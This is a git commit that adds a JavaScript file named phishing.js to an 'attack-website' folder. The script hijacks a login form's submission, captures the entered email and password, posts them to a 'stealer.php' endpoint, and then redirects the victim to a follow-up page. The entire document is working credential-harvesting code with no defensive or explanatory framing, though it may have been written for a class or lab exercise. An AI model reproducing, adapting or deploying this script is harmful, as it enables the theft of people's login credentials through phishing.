a7bcb792c92516681434b6d9f0b759487cece452
kant1 <124177119+MIleia@users.noreply.github.com>
2025-04-01 09:34:37 +0200

    Create phishing.js

---
+++ attack-website/phishing.js
@@ -0,0 +1,22 @@
+document.addEventListener("DOMContentLoaded", function() {
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+
+        let email = document.getElementById("email").value;
+        let password = document.getElementById("password").value;
+
+        fetch("stealer.php", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+        })
+        .then(response => response.text())
+        .then(data => {
+            window.location.href = "recup_phishing.html";
+        });
+    });
+});
+
+
